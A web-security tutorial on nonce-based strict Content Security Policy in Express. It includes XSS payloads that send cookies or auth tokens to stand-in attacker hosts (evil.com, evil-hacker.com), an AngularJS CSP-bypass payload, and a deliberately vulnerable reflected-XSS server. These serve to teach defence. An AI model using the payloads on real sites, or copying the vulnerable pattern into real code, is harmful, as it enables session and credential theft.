# 🪖 Content Security Policy (CSP) Deep-Dive

> The ultimate defense-in-depth shield: Nonce-based strict CSP, defeating Cross-Site Scripting (XSS), and configuring automated violation telemetry.

---

## 1. 🎯 Overview & Intuitive Mental Model

### The Production Hook
Even if your frontend team practices rigorous code reviews and uses modern frameworks like React or Angular, Cross-Site Scripting (XSS) can still sneak in. A single legacy `dangerouslySetInnerHTML`, a vulnerable npm markdown parser, or an SVG upload containing an embedded `<script>` tag can expose your users to complete session theft.

**Content Security Policy (CSP)** is your application's bulletproof vest. It is an HTTP response header that instructs the browser engine to enforce a strict allowlist on what content, scripts, stylesheets, frames, and network connections are allowed to load and execute. Even if an attacker successfully injects `<script>stealCredentials()</script>` into your page DOM, a hardened CSP prevents the browser from executing it.

### 🧠 The Fun Analogy: The "Tamper-Evident VIP Wristband"
Imagine an exclusive summit held at a private resort:
- **Legacy Security (Allowlists):** The bouncer has a list of approved caterers: *"Anyone wearing an apron from `cdnjs.cloudflare.com` can enter."* The problem? A rogue assassin puts on a Cloudflare apron (by abusing older, vulnerable Angular 1.x libraries hosted on CDNJS to construct a JSONP sandbox bypass) and enters the building anyway.
- **Modern Strict CSP (Nonces):** The bouncer throws away the caterer list. Instead, every morning at 6:00 AM, the resort stamps every approved staff member's hand with a unique, cryptographically random, secret holographic tattoo called a **`nonce`** (Number used ONCE).
- When a script wants to run on stage, the browser bouncer looks at its forehead. Does the script have `<script nonce="random_secret_xyz">`?
  - If yes, and the nonce matches today's server secret: **Execute!**
  - If the script was injected by a hacker via an input field: It lacks the secret nonce, so the bouncer tackles it, prevents execution, and calls the police (`report-to`).

### Severity & Impact
- **OWASP Category:** [A03:2021 – Injection](https://owasp.org/Top10/A03_2021-Injection/), [A05:2021 – Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)
- **Common Weakness Enumeration (CWE):**
  - **CWE-79:** Improper Neutralization of Input During Web Page Generation (XSS)
  - **CWE-1021:** Improper Restriction of Rendered UI Layers
- **Blast Radius:** Renders injected XSS payloads inert, halts unauthorized data exfiltration channels, blocks clickjacking frames, and restricts unauthorized plugin execution.

---

## 2. 🎨 Interactive Visual Architecture

```mermaid
sequenceDiagram
    autonumber
    actor Attacker as 🦹 Attacker
    actor Victim as 👤 Victim
    participant BrowserSandbox as 🛡️ Browser Sandbox Engine
    participant ExpressApp as ⚡ Express SSR Server
    participant ViolationService as 🚨 CSP Telemetry Collector

    Note over ExpressApp: Request Initialization
    Victim->>ExpressApp: GET /dashboard
    ExpressApp->>ExpressApp: 1. Generate unique cryptographic nonce: crypto.randomBytes(16)
    ExpressApp-->>Victim: 2. HTML Response with CSP Header:<br/>Content-Security-Policy: default-src 'self'; script-src 'nonce-d89f1a...' 'strict-dynamic';
    
    Note over BrowserSandbox: Legitimate Script Execution
    BrowserSandbox->>BrowserSandbox: 3. Encounters <script nonce="d89f1a...">legitReactApp()</script>
    BrowserSandbox->>BrowserSandbox: ✅ Nonce matches header: Script executes!

    Note over Attacker,BrowserSandbox: Malicious XSS Injection Attempt
    Attacker->>Victim: 4. Injects stored XSS payload: <script>fetch('https://evil.com?c='+document.cookie)</script>
    BrowserSandbox->>BrowserSandbox: 5. Evaluates injected <script> tag: NONCE MISSING!
    BrowserSandbox--xBrowserSandbox: 💥 EXECUTION BLOCKED: Script refused by CSP policy!

    Note over BrowserSandbox,ViolationService: Automated Incident Reporting
    BrowserSandbox->>ViolationService: 6. POST /csp-report-endpoint {blocked-uri, violated-directive: "script-src"}
```

> 💡 **Visual Inspection Tip:** Open Chrome DevTools (`F12`), open the **Console** tab, and observe CSP blocks highlighted in red: `Refused to execute inline script because it violates the following Content Security Policy directive...`. In the **Network** tab, inspect the document's `Response Headers` to view the full `Content-Security-Policy`.

---

## 3. 💥 Real-World Exploit Walkthrough

### Scenario: The CDN Allowlist & Unsafe-Inline Trap
Many development teams attempt to implement CSP by copying legacy allowlists or giving up and adding `'unsafe-inline'` to accommodate inline analytics snippets.

#### ❌ Vulnerable Server CSP Configuration (Node.js / Express)
```typescript
// vulnerable-csp-server.ts
import express from 'express';

const app = express();

// ⚠️ CATASTROPHIC CSP MISCONFIGURATIONS:
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    // 1. 'unsafe-inline' completely neutralizes XSS protection!
    // 2. cdnjs.cloudflare.com allows bypasses via vulnerable JSONP endpoints hosted on the CDN!
    // 3. Missing object-src allows Flash/Java object exploits!
    "default-src *; script-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com; style-src * 'unsafe-inline';"
  );
  next();
});

// Vulnerable SSR endpoint reflecting unsanitized query parameters
app.get('/search', (req, res) => {
  const query = req.query.q || '';
  res.send(`
    <!DOCTYPE html>
    <html>
      <head><title>Search Results</title></head>
      <body>
        <h1>Search Results for: ${query}</h1> <!-- ⚠️ Reflected XSS sink! -->
      </body>
    </html>
  `);
});

app.listen(3000);
```

#### 💥 The Attacker's Exploit Payload
Because `'unsafe-inline'` is enabled in the CSP, the attacker sends the victim this link:
```text
https://company.com/search?q=%3Cscript%3Efetch('https://evil-hacker.com/steal?data='%2BencodeURIComponent(localStorage.getItem('auth_token')))%3C/script%3E
```

Or, even if `'unsafe-inline'` were removed, the attacker exploits the permissive CDN allowlist (`cdnjs.cloudflare.com`) using a known AngularJS client-side template bypass payload:
```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
<div ng-app ng-csp>{{$on.constructor('alert(document.cookie)')()}}</div>
```

### Browser Behavior Breakdown
1. The browser receives the server's permissive CSP header.
2. The browser sees `'unsafe-inline'` and deliberately turns off its parser protection against inline script execution.
3. The injected `<script>` tag executes immediately in the context of the user's origin, stealing access tokens or making authenticated mutations.

---

## 4. 🛡️ Resolution & Defense-in-Depth

### The Modern Standard: Strict CSP Level 3 (`'strict-dynamic'`)
Modern best practice abandons brittle domain allowlists in favor of **Nonce-Based Strict CSP**:
- `'nonce-{random}'`: Authorizes only scripts tagged with the exact cryptographic token issued during that specific HTTP response.
- `'strict-dynamic'`: Instructs modern browsers that any script already vetted by a valid nonce is trusted to dynamically load child scripts (such as analytics loaders or async chunks) without needing separate domain whitelisting.
- Fallbacks (`'unsafe-inline' https:`): Automatically ignored by modern browsers when nonces and `'strict-dynamic'` are present, maintaining backward compatibility with older browsers.

### Production-Ready Hardened Implementation (Node.js / Express + Helmet)
```typescript
// hardened-csp-server.ts - PRODUCTION-GRADE NONCE-BASED STRICT CSP
import express, { Request, Response } from 'express';
import helmet from 'helmet';
import crypto from 'crypto';

const app = express();

// 🛡️ Middleware: Generate a cryptographically secure random nonce for every request
app.use((req: Request, res: Response, next) => {
  res.locals.cspNonce = crypto.randomBytes(16).toString('base64');
  next();
});

// 🛡️ Configure Helmet with Strict CSP Level 3
app.use((req: Request, res: Response, next) => {
  const nonce = res.locals.cspNonce;

  helmet({
    contentSecurityPolicy: {
      directives: {
        // Fallback for any directive not explicitly declared
        defaultSrc: ["'self'"],

        // Nonce-based strict script execution
        scriptSrc: [
          `'nonce-${nonce}'`,
          "'strict-dynamic'",
          // Fallback for legacy browsers without CSP v3:
          "'unsafe-inline'",
          "https:",
        ],

        // Restrict stylesheet loading
        styleSrc: ["'self'", `'nonce-${nonce}'`, "'unsafe-inline'"],

        // Restrict images to trusted origins and inline data URIs
        imgSrc: ["'self'", 'data:', 'https://images.unsplash.com'],

        // Restrict outbound fetch / WebSocket / XMLHttpRequest destinations
        connectSrc: ["'self'", 'https://api.bank.com', 'https://telemetry.bank.com'],

        // CRITICAL: Block legacy plugins (Flash, Java, Silverlight)
        objectSrc: ["'none'"],

        // Prevent attackers from manipulating the document <base href="...">
        baseUri: ["'none'"],

        // Block UI Redressing / Clickjacking
        frameAncestors: ["'none'"],

        // Prevent form submissions to rogue third-party endpoints
        formAction: ["'self'"],

        // Telemetry endpoint for automated attack reporting
        reportUri: '/api/v1/csp-violations',
      },
    },
  })(req, res, next);
});

// Server-rendered view attaching the nonce to legitimate scripts
app.get('/', (req: Request, res: Response) => {
  const nonce = res.locals.cspNonce;
  res.send(`
    <!DOCTYPE html>
    <html lang="en">
      <head>
        <meta charset="UTF-8">
        <title>Secure Banking Dashboard</title>
      </head>
      <body>
        <div id="root">Welcome to Secure Banking</div>

        <!-- 🛡️ Legitimate script executes because it contains the verified nonce -->
        <script nonce="${nonce}">
          console.log("Legitimate React application initialized with nonce:", "${nonce}");
        </script>

        <!-- 💥 Injected attacker script FAILS because attacker cannot predict the nonce -->
        <!-- <script>alert('Hacked!');</script> -->
      </body>
    </html>
  `);
});

// Telemetry endpoint to collect violations
app.post('/api/v1/csp-violations', express.json({ type: ['application/json', 'application/csp-report'] }), (req, res) => {
  console.warn('[CSP Violation Alert]:', req.body);
  res.status(204).end();
});

export default app;
```

### Static Single-Page Applications (Vite / Next.js SSG Hash Blueprint)
If your application is statically hosted (S3 / Cloudflare Pages / Vercel SSG) without an Express server to inject per-request nonces:
Use **SHA-256 Hashes**:
```http
Content-Security-Policy: default-src 'self'; script-src 'self' 'sha256-RFW6Up+/3NL+CU3Ng+aQfAgNqrhKT6VDHgkFY4/EZQ='; object-src 'none'; frame-ancestors 'none';
```
Modern bundlers (like Vite with `vite-plugin-csp`) calculate inline script hashes at build time and emit them directly into HTTP deployment headers.

---

## 5. 🧪 Hands-On Verification & Lab

### Testing CSP Violations in Chrome DevTools
1. Deploy or run `hardened-csp-server.ts`.
2. Open the page in Chrome and open DevTools (`F12`).
3. In the Console, type:
   ```javascript
   const badScript = document.createElement('script');
   badScript.innerText = "console.log('Attacker code running!')";
   document.body.appendChild(badScript);
   ```
4. Observe the immediate violation log:
   `Refused to execute inline script because it violates the following Content Security Policy directive: "script-src 'nonce-...' 'strict-dynamic'"...`

### Automated Integration Test (Supertest & Vitest)
```typescript
// csp.test.ts
import request from 'supertest';
import app from './hardened-csp-server';

describe('Content Security Policy Suite', () => {
  it('generates a new unique nonce for every HTTP response', async () => {
    const res1 = await request(app).get('/');
    const res2 = await request(app).get('/');

    const csp1 = res1.headers['content-security-policy'];
    const csp2 = res2.headers['content-security-policy'];

    // Nonce must exist in header
    expect(csp1).toMatch(/script-src 'nonce-[A-Za-z0-9+/=]+'/);
    expect(csp2).toMatch(/script-src 'nonce-[A-Za-z0-9+/=]+'/);

    // Nonces must be unique per request (never reused!)
    const nonce1 = csp1.match(/'nonce-([A-Za-z0-9+/=]+)'/)[1];
    const nonce2 = csp2.match(/'nonce-([A-Za-z0-9+/=]+)'/)[1];
    expect(nonce1).not.toEqual(nonce2);
  });

  it('enforces object-src none and base-uri none', async () => {
    const res = await request(app).get('/');
    const csp = res.headers['content-security-policy'];

    expect(csp).toContain("object-src 'none'");
    expect(csp).toContain("base-uri 'none'");
    expect(csp).toContain("frame-ancestors 'none'");
  });
});
```

---

## 6. 📋 Code Review Checklist

- [ ] **No Naked `'unsafe-inline'`:** Does the production policy forbid `'unsafe-inline'` in `script-src` unless paired with `'strict-dynamic'` and a nonce for legacy fallbacks?
- [ ] **Cryptographic Nonce Generation:** Are nonces created using a CSPRNG (`crypto.randomBytes(16)`) and freshly generated on every single HTTP request?
- [ ] **Object-Src None:** Is `object-src 'none'` explicitly configured to shut down plugin execution?
- [ ] **Base-Uri None or Self:** Is `base-uri 'none'` (or `'self'`) set to prevent malicious base-tag URL hijacking?
- [ ] **Frame-Ancestors Defined:** Is `frame-ancestors` declared in CSP rather than relying solely on obsolete `X-Frame-Options`?
- [ ] **Telemetry Configured:** Is `report-to` or `report-uri` active to catch CSP breakage and identify live injection attempts?
